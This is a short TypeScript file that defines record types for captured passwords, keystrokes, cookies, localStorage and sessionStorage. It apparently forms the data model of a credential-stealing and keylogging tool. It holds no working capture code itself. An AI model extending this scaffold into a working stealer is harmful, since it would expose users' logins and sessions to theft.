export namespace Record {
  export class password {
    project: string
    username: string
    password: string
    url: string
    width: number
    height: number
    localStorage: any
    sessionStorage: any
    cookies: string
    title: string
  }
  export class keylogger {
    project: string
    identifier: number // Session identifier aka the time
    keys: any
    url: string
    title: string
  }
  export class passwordData {
    a: string
    t: 0
    b: string | undefined
    c: string | undefined
    d: string | undefined
    e: number | undefined
    f: number | undefined
    g: any | undefined
    h: any | undefined
    i: string | undefined
    j: string | undefined
  }
  export class keyloggerData {
    a: string
    t: 1
    b: number
    c: any
    d: string
    j: string
  }
}